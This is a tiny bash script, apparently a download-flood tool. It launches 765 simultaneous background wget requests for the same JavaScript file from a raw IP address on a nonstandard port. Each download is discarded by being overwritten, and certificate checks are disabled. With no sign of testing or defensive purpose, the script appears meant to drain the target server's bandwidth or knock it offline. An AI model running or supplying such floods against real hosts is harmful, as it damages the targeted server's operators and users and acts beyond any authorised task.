for ((i=1; i<=765; i++))  
do  
nohup wget -O sbzp http://154.12.36.155:23333/js/chunk-vendors.66520c06.js --no-check-certificate > /${i}-start.log 2>&1 &
done
echo ok
